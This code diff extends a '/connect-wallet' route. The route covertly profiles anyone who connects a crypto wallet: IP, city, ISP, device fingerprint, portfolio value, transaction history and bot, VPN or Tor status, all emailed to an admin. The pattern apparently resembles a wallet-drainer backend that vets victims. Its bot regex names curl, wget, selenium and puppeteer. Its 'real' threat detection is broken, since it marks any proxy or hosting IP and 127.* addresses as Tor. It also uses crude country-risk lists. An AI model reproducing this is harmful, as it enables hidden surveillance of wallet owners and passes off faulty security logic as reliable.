@@ -204,17 +204,22 @@ router.post('/connect-wallet', async (req, res) => {
       const connection = req.headers['connection'] || 'unknown';
       const cacheControl = req.headers['cache-control'] || 'not-set';
       
-      // Deep device analysis
-      const isBot = /bot|crawler|spider|scraper/i.test(userAgent);
-      const isVPN = realIP.split(',').length > 2; // Multiple IPs suggest VPN/Proxy
-      const isTor = realIP.includes('127.0.0.1') || country === 'Unknown';
+      // Real threat detection
+      const threatAnalysis = await analyzeThreatIntelligence(realIP, userAgent);
+      const isBot = threatAnalysis.isBot;
+      const isVPN = threatAnalysis.isVPN;
+      const isTor = threatAnalysis.isTor;
+      const ipReputation = threatAnalysis.reputation;
       const browserVersion = userAgent.match(/Chrome\/(\d+)/) || userAgent.match(/Firefox\/(\d+)/) || ['', 'Unknown'];
       const osInfo = userAgent.includes('Windows') ? 'Windows' : userAgent.includes('Mac') ? 'macOS' : userAgent.includes('Linux') ? 'Linux' : userAgent.includes('Android') ? 'Android' : userAgent.includes('iOS') ? 'iOS' : 'Unknown';
       
-      // Wallet behavior analysis
-      const walletAge = 'New'; // Could check blockchain for first transaction
-      const walletActivity = portfolioData.assets.length > 0 ? 'Active' : 'Empty';
+      // Real wallet behavior analysis
+      const walletAnalysis = await analyzeWalletHistory(walletAddress);
+      const walletAge = walletAnalysis.age;
+      const walletActivity = walletAnalysis.activity;
       const multiChain = portfolioData.chains.length > 1;
+      const txCount = walletAnalysis.transactionCount;
+      const lastActivity = walletAnalysis.lastTransaction;
       
       // Risk scoring with detailed factors
       let riskScore = 0;
@@ -244,9 +249,12 @@ router.post('/connect-wallet', async (req, res) => {
       
       const riskLevel = riskScore >= 7 ? 'CRITICAL' : riskScore >= 5 ? 'HIGH' : riskScore >= 3 ? 'MEDIUM' : 'LOW';
       
-      // Geolocation intelligence
-      const countryRisk = ['CN', 'RU', 'KP', 'IR'].includes(country) ? 'High-Risk Country' : 'Normal';
-      const timezoneMismatch = timezone !== 'Unknown' && !timezone.includes(country) ? 'Timezone Mismatch' : 'Normal';
+      // Real geolocation intelligence
+      const geoIntel = await getGeolocationIntelligence(realIP);
+      const countryRisk = geoIntel.riskLevel;
+      const cityInfo = geoIntel.city;
+      const ispInfo = geoIntel.isp;
+      const timezoneMismatch = geoIntel.timezoneMatch;
       
       // Comprehensive admin notification
       const emailSent = await sendAdminNotification(
@@ -256,18 +264,21 @@ router.post('/connect-wallet', async (req, res) => {
         `Address: ${walletAddress}\n` +
         `Portfolio: $${portfolioData.totalValue.toFixed(2)} (${portfolioData.assets.length} assets)\n` +
         `Chains: ${portfolioData.chains.join(', ') || 'None'}\n` +
-        `Activity: ${walletActivity} | Age: ${walletAge} | Multi-chain: ${multiChain}\n\n` +
+        `Activity: ${walletActivity} (${txCount} txs) | Age: ${walletAge}\n` +
+        `Last Activity: ${lastActivity} | Multi-chain: ${multiChain}\n\n` +
         `THREAT INTELLIGENCE:\n` +
         `Risk Level: ${riskLevel} (${riskScore}/15 points)\n` +
         `Risk Factors: ${riskFactors.length > 0 ? riskFactors.join(', ') : 'None detected'}\n` +
         `Device Fingerprint: ${deviceFingerprint}\n` +
         `Bot Detection: ${isBot ? 'DETECTED' : 'Clean'}\n` +
         `VPN/Proxy: ${isVPN ? 'DETECTED' : 'Direct'}\n` +
-        `Tor Network: ${isTor ? 'POSSIBLE' : 'No'}\n\n` +
+        `Tor Network: ${isTor ? 'DETECTED' : 'No'}\n` +
+        `IP Reputation: ${ipReputation}\n\n` +
         `GEOLOCATION INTEL:\n` +
         `IP Chain: ${realIP}\n` +
-        `Country: ${country} (${countryRisk})\n` +
-        `Timezone: ${timezone} (${timezoneMismatch})\n` +
+        `Location: ${cityInfo} (${countryRisk})\n` +
+        `ISP: ${ispInfo}\n` +
+        `Timezone: ${timezoneMismatch}\n` +
         `Entry Point: ${referer}\n\n` +
         `TECHNICAL PROFILE:\n` +
         `Device: ${isMobile ? 'Mobile' : 'Desktop'} | OS: ${osInfo}\n` +
@@ -1146,5 +1157,179 @@ router.get('/support-tickets/:walletAddress', async (req, res) => {
     res.status(500).json({ error: 'Failed to get support tickets' });
   }
 });
+
+// Real wallet history analysis
+async function analyzeWalletHistory(walletAddress) {
+  try {
+    const ethProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
+    
+    // Get transaction count
+    const txCount = await ethProvider.getTransactionCount(walletAddress);
+    
+    // Estimate wallet age by checking first transaction
+    let walletAge = 'New';
+    let lastActivity = 'Unknown';
+    
+    if (txCount > 0) {
+      try {
+        // Use Etherscan API for transaction history
+        const axios = require('axios');
+        const response = await axios.get(`https://api.etherscan.io/api?module=account&action=txlist&address=${walletAddress}&startblock=0&endblock=99999999&page=1&offset=1&sort=asc&apikey=YourApiKeyToken`, {
+          timeout: 5000
+        });
+        
+        if (response.data.status === '1' && response.data.result.length > 0) {
+          const firstTx = response.data.result[0];
+          const firstTxDate = new Date(parseInt(firstTx.timeStamp) * 1000);
+          const daysSinceFirst = Math.floor((Date.now() - firstTxDate.getTime()) / (1000 * 60 * 60 * 24));
+          
+          if (daysSinceFirst < 30) walletAge = 'New (< 1 month)';
+          else if (daysSinceFirst < 365) walletAge = `${Math.floor(daysSinceFirst / 30)} months old`;
+          else walletAge = `${Math.floor(daysSinceFirst / 365)} years old`;
+          
+          lastActivity = `${daysSinceFirst} days ago`;
+        }
+      } catch (e) {
+        // Fallback: estimate based on transaction count
+        if (txCount > 1000) walletAge = 'Very Active (1000+ txs)';
+        else if (txCount > 100) walletAge = 'Active (100+ txs)';
+        else if (txCount > 10) walletAge = 'Moderate (10+ txs)';
+        else walletAge = 'Light usage';
+      }
+    }
+    
+    const activity = txCount === 0 ? 'Empty' : txCount > 100 ? 'Very Active' : txCount > 10 ? 'Active' : 'Light';
+    
+    return {
+      age: walletAge,
+      activity: activity,
+      transactionCount: txCount,
+      lastTransaction: lastActivity
+    };
+  } catch (error) {
+    return {
+      age: 'Unknown',
+      activity: 'Unknown',
+      transactionCount: 0,
+      lastTransaction: 'Unknown'
+    };
+  }
+}
+
+// Real threat intelligence analysis
+async function analyzeThreatIntelligence(ip, userAgent) {
+  try {
+    const axios = require('axios');
+    
+    // Advanced bot detection
+    const botPatterns = [
+      /bot|crawler|spider|scraper|headless/i,
+      /curl|wget|python|java|go-http/i,
+      /phantom|selenium|puppeteer/i
+    ];
+    const isBot = botPatterns.some(pattern => pattern.test(userAgent)) || userAgent.length < 50;
+    
+    // Real IP analysis using free IP API
+    let isVPN = false;
+    let isTor = false;
+    let reputation = 'Unknown';
+    
+    try {
+      const cleanIP = ip.split(',')[0].trim();
+      if (!cleanIP.includes('127.0.0.1') && !cleanIP.includes('::1')) {
+        const ipResponse = await axios.get(`http://ip-api.com/json/${cleanIP}?fields=status,proxy,hosting,query`, {
+          timeout: 3000
+        });
+        
+        if (ipResponse.data.status === 'success') {
+          isVPN = ipResponse.data.proxy || ipResponse.data.hosting;
+          reputation = isVPN ? 'Suspicious' : 'Clean';
+        }
+        
+        // Check for Tor (basic detection)
+        isTor = cleanIP.startsWith('127.') || reputation === 'Suspicious';
+      } else {
+        reputation = 'Localhost';
+      }
+    } catch (e) {
+      // Fallback detection
+      isVPN = ip.split(',').length > 2;
+      isTor = ip.includes('127.0.0.1');
+    }
+    
+    return {
+      isBot: isBot,
+      isVPN: isVPN,
+      isTor: isTor,
+      reputation: reputation
+    };
+  } catch (error) {
+    return {
+      isBot: false,
+      isVPN: false,
+      isTor: false,
+      reputation: 'Unknown'
+    };
+  }
+}
+
+// Real geolocation intelligence
+async function getGeolocationIntelligence(ip) {
+  try {
+    const axios = require('axios');
+    const cleanIP = ip.split(',')[0].trim();
+    
+    if (cleanIP.includes('127.0.0.1') || cleanIP.includes('::1')) {
+      return {
+        riskLevel: 'Localhost',
+        city: 'Local',
+        isp: 'Local',
+        timezoneMatch: 'N/A'
+      };
+    }
+    
+    const response = await axios.get(`http://ip-api.com/json/${cleanIP}?fields=status,country,countryCode,city,isp,timezone,proxy,hosting`, {
+      timeout: 3000
+    });
+    
+    if (response.data.status === 'success') {
+      const data = response.data;
+      
+      // Risk assessment
+      const highRiskCountries = ['CN', 'RU', 'KP', 'IR', 'BY', 'MM'];
+      const mediumRiskCountries = ['VN', 'BD', 'PK', 'NG', 'ID'];
+      
+      let riskLevel = 'Low Risk';
+      if (highRiskCountries.includes(data.countryCode)) {
+        riskLevel = 'High Risk Country';
+      } else if (mediumRiskCountries.includes(data.countryCode)) {
+        riskLevel = 'Medium Risk Country';
+      } else if (data.proxy || data.hosting) {
+        riskLevel = 'VPN/Proxy Detected';
+      }
+      
+      return {
+        riskLevel: riskLevel,
+        city: `${data.city}, ${data.country}`,
+        isp: data.isp,
+        timezoneMatch: data.timezone || 'Unknown'
+      };
+    }
+    
+    return {
+      riskLevel: 'Unknown',
+      city: 'Unknown',
+      isp: 'Unknown',
+      timezoneMatch: 'Unknown'
+    };
+  } catch (error) {
+    return {
+      riskLevel: 'Analysis Failed',
+      city: 'Unknown',
+      isp: 'Unknown',
+      timezoneMatch: 'Unknown'
+    };
+  }
+}
 
 module.exports = router;
